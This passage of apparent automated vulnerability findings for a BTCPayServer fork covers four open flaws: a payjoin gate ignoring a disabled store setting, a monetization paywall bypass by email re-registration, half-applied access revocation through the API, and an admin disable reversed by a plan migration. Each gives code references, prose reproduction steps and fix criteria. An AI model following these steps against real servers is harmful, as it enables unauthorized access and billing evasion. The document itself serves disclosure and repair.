2. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:331–337](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L331-L337)
   For the receive-address branch due is hard-set to Money.Zero, so any mempool-valid output amount qualifies as a 'fully paid' payjoin candidate; there is no invoice-level PayjoinEnabled snapshot to fall back on.
3. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:384–391](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L384-L391)
   The only store-level gate applied afterwards is IsHotWallet and the derivation-scheme match. StoreBlob.PayJoinEnabled is never checked, so a hot-wallet store that has payjoin disabled still has its UTXO locked and signed.
4. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:307–314](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L307-L314)
   Contrast: the invoice branch does enforce the opt-in (paymentDetails.PayjoinEnabled) and skips the output otherwise.
5. [BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs:182–184](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs#L182-L184)
   Source of the invoice-branch flag: PayjoinEnabled is derived from StoreBlob.PayJoinEnabled at invoice creation, showing the setting is the intended consent gate for the endpoint.
6. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:340–366](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L340-L366)
   Once the branch is reached the server locks the sender's inputs, fetches the store's UTXO set and selects/locks one merchant UTXO for contribution.
7. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:400–407](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L400-L407)
   The hot-wallet account private key is fetched from NBXplorer metadata.
8. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:493–512](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L493-L512)
   The account key signs the contributed merchant input and the finalized proposal is returned to the anonymous caller.
9. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:891–898](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L891-L898)
   The receive page only advertises the pj= endpoint when IsHotWallet && PayJoinEnabled, showing the maintainers intend PayJoinEnabled to gate receive-address payjoin. The endpoint URL is public and deterministic (/{cryptoCode}/pj), so the gate at advertisement time is not enforcement.
10. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs:133–139](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs#L133-L139)
   Same advertisement-only gate in the Greenfield receive-address endpoint.
11. [BTCPayServer/Services/Wallets/WalletReceiveService.cs:137–149](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Wallets/WalletReceiveService.cs#L137-L149)
   GetByScriptPubKey matches any receive address currently held in memory for any store of that crypto code; the address is added by GetOrGenerate whenever a store member opens the Receive page or calls the Greenfield receive-address API, and removed only when a transaction paying it is seen, the wallet changes, or it is un-reserved.

## Impact
Confidentiality: one merchant hot-wallet UTXO disclosed per probe, against the merchant's explicit configuration; repeated probes with fresh inputs disclose further UTXOs. Integrity: the merchant hot wallet signs and the merchant's coin is spent into a coinjoin without the merchant's opt-in, though value returns to the merchant's own output so no funds are lost. No availability impact beyond the UTXO lock (filed separately).

## Reproduction steps
1. Attacker is an anonymous payer who was handed a wallet receive address (the normal payer position). They craft a signed, mempool-valid transaction paying any amount to that address and POST it as text/plain to the public /{cryptoCode}/pj endpoint. Preconditions outside attacker control: the store uses a hot wallet, a receive address is currently live in WalletReceiveService memory (the merchant opened the Receive page or called the API) and the store has disabled PayJoin. Rate limit is 5 req/min per IP. No credentials or victim interaction needed.

## Recommended fix
The wallet-receive-address branch of PayJoinEndpointController.Submit performs UTXO contribution and hot-wallet signing without verifying that the owning store has opted into PayJoin (StoreBlob.PayJoinEnabled), while the invoice branch does enforce the opt-in. Fix criteria: A payjoin proposal must never be produced for a store whose PayJoinEnabled is false, on every matching path (invoice and receive address). Verify by disabling PayJoin on a hot-wallet store, obtaining a receive address, POSTing a valid transaction paying it to /BTC/pj, and confirming the response is an error, no merchant UTXO is locked, and no signing occurs.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257273

---

# Re-registering a previously used email (anonymous API or own-store invite) permanently skips monetization enrollment (paywall bypass)

## Details
On a monetized server every non-admin user is meant to be a subscriber of the monetization offering: the UserEvent.Registered handler (MonetizationHostedService.cs 158-185) calls MigrateUsers, and MonetizationLoginExtension refuses login only when a subscriber exists and is inactive or in a plan without can-access. A user with no subscriber at all is admitted (MonetizationLoginExtension.cs 24-26).

MigrateUsers binds the new account to an existing customer purely by matching the registration email against customers_identities rows of type 'Email' in the monetization store (customers_already_created, 294-298). That identity is written once at enrollment and never updated: changing the account email through UIManageController.Index (155-173) or PUT /api/v1/users/me only calls SetUserNameAsync/SetEmailAsync and no handler touches the customer. When the matched customer is already bound to another ApplicationUserId, the new identity insert hits the (customer_id, type) primary key and is dropped by ON CONFLICT DO NOTHING (318-323); the subscriber insert hits the (customer_id, offering_id) unique index and is dropped too (349); the final SELECT reads only inserted_subs, so MigrateUsers returns nothing and the handler exits. The new account has no subscriber, no lockout computation and no NewSubscriber event. The administrator's 'migrate-users' action (AllUsersQuery, 228-249) runs the same CTEs and fails identically, so the state cannot be repaired from the UI.

Attack (self-registered user on a monetized server; registration enabled, which the monetization sign-up page itself requires at UIUserMonetizationController.cs:38):
1. Obtain account A with email X (own mailbox) via /monetization/new-user or anonymous POST /api/v1/users. A is enrolled: customer C(Email=X, ApplicationUserId=A) and subscriber S.
2. In Account settings (or PUT /api/v1/users/me) change A's email to Y (own mailbox; requires only A's password). C still carries Email=X.
3. Create account B with email X, now free because UserName/Email uniqueness follows A's new value: either anonymous POST /api/v1/users (GreenfieldUsersController.cs 322-428, gated only by LockSubscription/DisableNonAdminCreateUserApi, publishes Registered) or, from a store A owns, 'Add user' X (UIStoresController.Users.cs 55-75, creates the account and publishes Invited, returning the invitation link). The sanctioned checkout refuses X ('already has a subscription', UIPlanCheckoutController.cs 112-116), and POST /register is redirected on monetized servers because activation sets RegisterPageRedirect (UIServerMonetizationController.cs 356-357; UIAccountController.cs 528-549) unless the admin cleared that policy. Registered/Invited -> MigrateUsers: C matches by email, both inserts are suppressed, nothing is returned.
4. Confirm X, set B's password and log in. The login extension finds no subscriber and returns; B has permanent access to the server (stores, invoices, wallets, internal Lightning node where allowed) without trial, payment or any future lockout, never appears in any plan's subscriber list, and the admin migration cannot enroll it. A can be abandoned or reused.

The same logic silently un-enrolls any legitimate newcomer whose address a previous user has since replaced (e.g. an admin- or store-invited user), and a newcomer whose address already belongs to an orphan checkout-created customer carrying a subscriber row.

Conditions: Monetization active and public registration enabled (LockSubscription false; the state /monetization/new-user requires, and the default when the server is not started with --disable-registration). Email confirmation, which activation forces on, is no obstacle because the attacker owns both mailboxes.

## Evidence
1. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:294–356](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L294-L356)
   customers_already_created (294-298) joins the registering user's email against every customers_identities row of type 'Email' in the monetization store, even when that customer already carries another account's ApplicationUserId. The user is then excluded from customers_to_create; inserted_userId_identities (318-323) hits the (customer_id, type) primary key and is dropped by ON CONFLICT DO NOTHING; inserted_subs (324-351) hits the (customer_id, offering_id) unique index and is dropped too; the final SELECT (352-355) reads only inserted_subs, so MigrateUsers returns an empty array and neither UpdateUserLockoutStatus nor a NewSubscriber event follows.
2. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:158–185](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L158-L185)
   The UserEvent.Registered handler (also receives UserEvent.Invited, a Registered subtype, via SubscribeAny) is the only enrollment point for new users; it acts only when MigrateUsers returns a row and has no fallback for a user left without a subscriber.
3. [BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs:24–26](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs#L24-L26)
   When no subscriber is bound to the user's ApplicationUserId the extension returns without a failure, so UserService.CanLogin (used by cookie login, API-key and Basic auth) admits the un-enrolled user: the gate fails open.
4. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:228–249](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L228-L249)
   AllUsersQuery (admin 'migrate-users') selects users with no ApplicationUserId identity in the offering and feeds the same CTE chain; the un-enrolled user matches the same stale Email row, both inserts conflict again, and the administrator cannot repair the account from the UI.
5. [BTCPayServer/Controllers/UIManageController.cs:155–173](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.cs#L155-L173)
   A user changes their account email (and UserName) with only their current password; only SetUserNameAsync/SetEmailAsync are called and no UserEvent handler updates the customers_identities 'Email' row, so the old address stays attached to the customer bound to this account. GreenfieldUsersController.UpdateCurrentUser (200-212) is the equivalent API path.
6. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:322–428](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L322-L428)
   [AllowAnonymous] POST /api/v1/users creates an ApplicationUser for any email not currently held by a user, refusing anonymous callers only when LockSubscription (341, 356) or DisableNonAdminCreateUserApi is set; it does not consult RegisterPageRedirect and publishes UserEvent.Registered (428). This is the attacker's route to re-register the freed address.
7. [BTCPayServer/Controllers/UIStoresController.Users.cs:33–75](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStoresController.Users.cs#L33-L75)
   Alternative route: an owner of any store (CanModifyStoreSettings on their own store) adds an email; when FindByEmailAsync returns null and CanCreateUser() holds (149: !LockSubscription || CanCreateUser permission) a new ApplicationUser is created and UserEvent.Invited is published, which the monetization handler processes as Registered and which returns the invitation link to the inviter.
8. [BTCPayServer/Plugins/Monetization/Controllers/UIServerMonetizationController.cs:351–360](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/Controllers/UIServerMonetizationController.cs#L351-L360)
   Activation sets PoliciesSettings.RegisterPageRedirect to /monetization/new-user, and POST /register returns the GET's redirect when that policy is set (UIAccountController.cs 528-549), so the web registration form is not the route on a default monetized server. UIUserMonetizationController.cs:38 makes the monetization sign-up page itself require EnableRegistration (= !LockSubscription), so a monetized server that enrolls the public runs with registration enabled, leaving the API and invite routes open.
9. [BTCPayServer/Plugins/Subscriptions/Controllers/UIPlanCheckoutController.cs:109–116](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UIPlanCheckoutController.cs#L109-L116)
   The sanctioned monetization sign-up (checkout) refuses an email that already has a subscriber in the offering, so the stale customer can only be reached through the Registered-event enrollment in MigrateUsers; this is why the defect lives in MigrateUsers and not in the checkout.
10. [BTCPayServer.Data/Data/CustomerIdentityData.cs:27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/CustomerIdentityData.cs#L27)
   The only key on customers_identities is (customer_id, type): a customer holds at most one ApplicationUserId and one Email, and a stale Email identity is never displaced.
11. [BTCPayServer.Tests/MonetizationTests.cs:118–129](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/MonetizationTests.cs#L118-L129)
   The maintainers' test states the guarantee: every newly created non-admin user must become a subscriber of the monetization offering and be subject to its login gate.

## Impact
The server's monetization gate — the operator's control over who may hold an account and use the multi-tenant service — is bypassed permanently and invisibly: the account is never locked out, never billed, never appears in a plan's subscriber list, and the administrator's migration cannot repair it. The attacker gains the full capabilities of a paying user (stores, wallets, invoices, server Lightning node where permitted) without authorization: a limited confidentiality and integrity impact on the vulnerable system; no availability impact.

## Reproduction steps
1. Attacker is a self-registered user of a monetized server (threat-model adversary 2; PR:LOW). Over the network they obtain account A with their own email X, change its email to Y from the profile page or PUT /api/v1/users/me (password only), then create a second account with X through anonymous POST /api/v1/users or by inviting X from a store they own, and confirm it. MigrateUsers matches the stale Email identity, both inserts are suppressed by ON CONFLICT DO NOTHING, and the second account is never enrolled; MonetizationLoginExtension admits users without a subscriber. Requires Monetization to be active and public registration enabled (AT:PRESENT) — the configuration the monetization sign-up page itself requires. No victim interaction, no defenses to defeat, deterministic.

## Recommended fix
1. MigrateUsers resolves the registering user to an existing customer by a stale, non-unique Email identity and silently drops both the identity and the subscriber insert on conflict, leaving the user unenrolled; the Registered handler and the admin migration trust the empty result. Fix criteria: Every non-admin, non-bypass user registered on a monetized server must end up with exactly one monetization subscriber bound to their ApplicationUserId, regardless of pre-existing customers with the same email (e.g. only reuse a customer that has no ApplicationUserId and no subscriber for the offering, otherwise create a fresh customer; or fail loudly). Verify: change an account's email, register the old address again, and confirm the new account has a subscriber and is subject to the login gate.
2. MonetizationLoginExtension treats the absence of a subscriber as permission to log in, so any enrollment gap becomes a bypass. Fix criteria: A non-admin, non-bypass user with no monetization subscriber must be enrolled on demand or refused login with a message, never admitted silently; verify that a user row with no customers_identities link cannot log in while Monetization is active.
3. Account email changes do not propagate to the customer's Email identity, so the monetization customer keeps claiming an address the account no longer owns. Fix criteria: Changing a user's email must update (or remove) the corresponding Email identity on the user's monetization customer so the old address can no longer match a different account; verify customers_identities after an email change.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257778

---

# Greenfield plan update removes can-access without PlanUpdated, leaving subscribers' sessions and stores active

## Details
Monetization decides who may use the server from the can-access feature of the subscriber's plan. When an operator removes can-access from a plan, the intended behaviour (MonetizationTests.cs 232-243) is that every subscriber of that plan is locked out immediately: the UI edit (UIOfferingController.AddPlan POST, 694-712) publishes SubscriptionEvent.PlanUpdated, and MonetizationHostedService (91-95 -> UpdateUserLockoutStatus 367-407) sets LockoutEnd, rotates each user's SecurityStamp so their cookies are rejected within the 5-minute validation interval, and flips NoActiveUser on their stores so invoice creation stops.

The Greenfield equivalent, PUT /api/v1/stores/{storeId}/offerings/{offeringId}/plans/{planId} (GreenfieldOfferingController.UpdateOfferingPlan, 208-268; client method UpdateOfferingPlan), performs the same feature replacement (239-261) but publishes no event. Nothing else observes the change: BTCPayServerSecurityStampValidator only compares stamps (59-71), and the application cookie keeps the framework default sliding lifetime (BTCPayServerServices.cs 935-941 sets no ExpireTimeSpan). MonetizationLoginExtension (38-44) does reject new logins, API keys and Basic auth for the now access-less plan, so the operator sees a half-applied revocation: users who are already logged in keep full cookie-authenticated access to the server for as long as they stay active, their accounts are not marked locked, and their stores keep creating invoices and receiving funds because NoActiveUser is never recomputed. The state is only corrected by an unrelated later event for that subscriber (PlanStarted on a plan change, SubscriberDisabled on expiry or suspension), which for a yearly or lifetime plan may be months away or never. SubscriptionHostedService.UpdatePlanStats (79-82) is likewise skipped, so the plan's member statistics shown to the operator go stale.

The same gap applies in the other direction (adding can-access via the API leaves subscribers locked until a later event), which is fail-closed and only an availability nuisance; the security-relevant direction is removal.

Conditions: Monetization active; the operator (or an API key holding btcpay.store.canmodifyofferings on the monetization store, included in CanModifyStoreSettings) changes plan features through the Greenfield API rather than the UI; the affected subscriber holds an existing cookie session. No action by the subscriber is required beyond continuing to use the site.

## Evidence
1. [BTCPayServer/Plugins/Subscriptions/Controllers/GreenfieldOfferingController.cs:208–268](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/GreenfieldOfferingController.cs#L208-L268)
   PUT /api/v1/stores/{storeId}/offerings/{offeringId}/plans/{planId} (policy btcpay.store.canmodifyofferings, included in CanModifyStoreSettings) replaces the plan's feature set (RemoveRange existing PlanFeatures at 241-243, Add requested at 255-259), saves at 266 and returns, without publishing SubscriptionEvent.PlanUpdated. Documented in wwwroot/swagger/v1/swagger.template.subscriptions.json and exposed by the shipped client as BTCPayServerClient.UpdateOfferingPlan.
2. [BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs:694–712](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs#L694-L712)
   The UI edit path performing the same feature replacement reloads the features and publishes SubscriptionEvent.PlanUpdated(plan) at line 711; rg shows this is the only publisher of PlanUpdated in production code.
3. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:91–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L91-L95)
   Lockout recomputation for every subscriber of a plan (UpdateUserLockoutStatus) is triggered exclusively by PlanUpdated; no periodic reconciliation exists in this service (it is purely event-driven).
4. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:367–407](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L367-L407)
   UpdateUserLockoutStatus is the shipped revocation control: it recomputes canAccess (373), sets LockoutEnabled/LockoutEnd and rotates SecurityStamp in SQL (375-399), calls securityStampInvalidator.Invalidate for locked users (401-403) and recomputes the stores' NoActiveUser flag (405), which UIInvoiceController.cs:212 uses to refuse invoice creation. None of this runs on the API path.
5. [BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs:38–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs#L38-L44)
   UserService.CanLogin (called by the cookie login, APIKeysAuthenticationHandler.cs:56 and BasicAuthenticationHandler.cs:73) refuses users whose plan lacks can-access, so new logins and API/Basic auth are cut off while already-issued cookies are not: the revocation is half-applied.
6. [BTCPayServer/Services/BTCPayServerSecurityStampValidator.cs:59–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/BTCPayServerSecurityStampValidator.cs#L59-L70)
   Cookie revalidation honours explicit invalidations and otherwise defers to the framework SecurityStampValidator, which compares the stored stamp only; it does not re-run CanLogin or the plan-feature check, so an existing cookie stays valid while the stamp is unchanged.
7. [BTCPayServer/Hosting/Startup.cs:122–124](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L122-L124)
   SecurityStampValidatorOptions.ValidationInterval is 5 minutes: on the UI path the rotated stamp kills existing cookies within 5 minutes; on the API path there is nothing for this check to detect.
8. [BTCPayServer/Hosting/BTCPayServerServices.cs:935–941](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L935-L941)
   The Identity application cookie is only given login/denied/logout paths; no ExpireTimeSpan or SlidingExpiration override, so the framework default (14-day sliding) applies and an active subscriber's session renews indefinitely. Login at UIAccountController.cs:284 passes IsPersistent = RememberMe.
9. [BTCPayServer.Tests/MonetizationTests.cs:232–243](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/MonetizationTests.cs#L232-L243)
   The maintainers' test documents the intended guarantee for feature removal: 'This should cut off access', asserting a MonetizationLockoutUpdated event with every subscriber locked out. The Greenfield path provides no such guarantee.

## Impact
An access revocation the operator has issued is not enforced for already-authenticated subscribers: they keep full cookie-authenticated use of the server (reading and modifying their stores, creating invoices and receiving payments on the operator's instance) for the sliding lifetime of their session, their accounts are not marked locked in the admin UI, and plan member statistics (SubscriptionHostedService.UpdatePlanStats on PlanUpdated) go stale. The state self-corrects only on an unrelated later event for that subscriber (PlanStarted on a plan change, SubscriberDisabled on expiry/suspension). Limited confidentiality and integrity impact on the server's access-control state; no availability impact.

## Reproduction steps
1. The beneficiary is an authenticated non-admin subscriber (PR:LOW) whose plan loses can-access through the Greenfield plan-update endpoint. No exploit step is needed beyond continuing to use the existing cookie session over the network: BTCPayServerSecurityStampValidator keeps accepting it because no stamp rotation, lockout or invalidation occurred, and NoActiveUser is never set on their stores. Attack requirement (AT:PRESENT): Monetization is active and the operator revokes can-access through the documented API rather than the UI; both are sanctioned paths, not a disabled or misconfigured control. Assumptions on the framework (ASP.NET Core Identity shipped with net10.0): SecurityStampValidator.VerifySecurityStamp compares the stored SecurityStamp only and does not re-evaluate lockout or login extensions; the application cookie defaults to a 14-day sliding lifetime. No user interaction.

## Recommended fix
GreenfieldOfferingController.UpdateOfferingPlan mutates plan features (the input to the monetization access decision) without publishing SubscriptionEvent.PlanUpdated, so the lockout recomputation, security-stamp rotation, NoActiveUser update and plan-stats refresh that the UI path triggers never run. Fix criteria: Every code path that changes a plan's features or other access-relevant attributes — including the Greenfield plan update and offering-feature removal via UpdateOffering/UIOfferingController.UpdateFeatures, which cascades to plan features — must trigger the same recomputation as the UI plan edit (publish PlanUpdated with features loaded, or invoke the recomputation directly). Verify by removing can-access via the API and confirming a MonetizationLockoutUpdated event with all subscribers locked, their existing cookies rejected within the validation interval, NoActiveUser set on their stores, and plan stats refreshed.

---
**Severity:** LOW
**Status:** Open
**Category:** Insufficient session expiration
**CWE:** [CWE-613](https://cwe.mitre.org/data/definitions/613.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257777

---

# Admin-disabled subscriber clears their disabled state by buying a plan migration via LimitedLogin portal

## Details
Disabling a user (UIServerController ToggleUserPost / Greenfield POST /api/v1/users/{id}/lock) is implemented solely as LockoutEnd = MaxValue via UserService.SetDisabled. Monetization re-uses the same primitive for subscription state and, on SubscriptionEvent.PlanStarted to a different plan that has the can-access feature (MonetizationHostedService.cs 84-89 -> UpdateUserLockout 202-212), calls SetDisabled(user, false) for any non-admin without checking that the subscription is active/not suspended or that the disable was administrative. This contradicts the service's own SQL recomputation (lines 379-380), which keeps a user locked unless `ss.active AND canAccess`. (The verified finding disabled-account-reenabled-via-login-lockout-overwrite documents the same state overloading via AccessFailedAsync; this is a distinct source and path.)

A disabled user X can trigger that event themselves:
1. The admin disables X. DisabledChanged (Source null) makes Monetization suspend X's subscription with reason 'Account disabled by administrator' (146-156); IsActive becomes false, IsSuspended true.
2. X POSTs /login with their password. IsDisabledTemporarily is false for a permanent disable (ApplicationUser.cs 42-43; UIAccountController 199 only short-circuits temporary lockouts), CanLogin fails on IsDisabled and on the suspension, and RedirectLoginSuccess (488-495) signs X in under the LimitedLogin cookie and redirects to FailedRedirectUrl, which MonetizationLoginExtension (28-34, 60-64) set to ~/account/billing?fastRedirect=true for a suspended subscriber.
3. ManageBilling (UIUserMonetizationController 56-98) accepts LimitedLogin (the principal keeps AuthenticationType Identity.Application, so CookieAuthenticationClaimTransformer grants Unrestricted and the CanViewProfile policy passes), finds X's subscriber and mints a PortalSessionData; the anonymous portal renders every configured PlanChange regardless of suspension (SubscriberPortal.cshtml 493).
4. X POSTs command=migrate with a changedPlanId reachable through a PlanChange (UISubscriberPortalController 209-229); CreatePlanMigrationCheckout (SubscriptionHostedService 712-752) validates only that the PlanChange exists and creates a HardMigration checkout; ProceedToSubscribe creates an invoice for price - credit - unused-period refund (182-230), or starts the plan immediately with no invoice when that amount is <= 0.
5. On payment, ProcessSubscriptionPayment -> TryStartPlan: CanStartNextPlanEx fails (IsSuspended/phase Normal) but the HardMigration branch (551-573) has no suspension check; TryCreditDebitSubscriber succeeds because the invoice credit plus the unused-period refund equals the new price, StartNextPlan runs (it does not touch IsSuspended) and PlanStarted(sub, prevPlan) fires (575). A plan change with Timing=AtPeriodEnd scheduled from the portal produces the same PlanStarted at period end (UpdateSubscriptionStates 303-313) with no payment at all. The subsequent UpdateSubscriptionStates emits no SubscriberDisabled because IsActive was already false, so nothing re-locks the user.
6. MonetizationHostedService sees PreviousPlan != Plan and canAccess true -> SetDisabled(X, false, Monetization): LockoutEnd is cleared, DisabledChanged(false) is published, the admin users list (UIServerController.Users.cs 79) now shows X as enabled, and UpdateStoreNoActiveUserForUsers flips NoActiveUser back to false on X's stores.

Effect: the administrative disable is silently reversed. Cookie, API-key and Basic logins remain blocked only because MonetizationLoginExtension independently fails CanLogin while the subscription is suspended, but the concrete controls the disable gave the operator are undone: CreateInvoiceCoreRaw's NoActiveUser gate (UIInvoiceController 209-213) re-opens, so X's PoS, crowdfund, payment-request, pay-button and LNURL invoices work again and X keeps receiving funds and webhooks while 'disabled'; the admin is shown a wrong account state; and the durable admin disable is replaced by the softer subscription suspension, so if the operator later demonetizes (UIServerMonetizationController 301-306 clears OfferingId and the extension stops checking) X is fully active without any admin action.

Conditions: Monetization active; the offering has a PlanChange from X's plan to a plan with can-access (as in the maintainers' own test scenario, MonetizationTests.cs 255-283); X knows their credentials.

## Evidence
1. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:84–89](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L84-L89)
   On SubscriptionEvent.PlanStarted with a different plan, the service calls UpdateUserLockout(ps, userManager, canAccess) where canAccess is only whether the new plan has can-access; it does not check Subscriber.IsActive/IsSuspended nor whether the account was disabled by an administrator. This is the code the fix must change.
2. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:202–212](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L202-L212)
   UpdateUserLockout calls userService.SetDisabled(user.Id, !activated, ...) - i.e. SetDisabled(false) for any non-admin user when the new plan has can-access, unconditionally reversing a previously set disabled state.
3. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:376–391](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L376-L391)
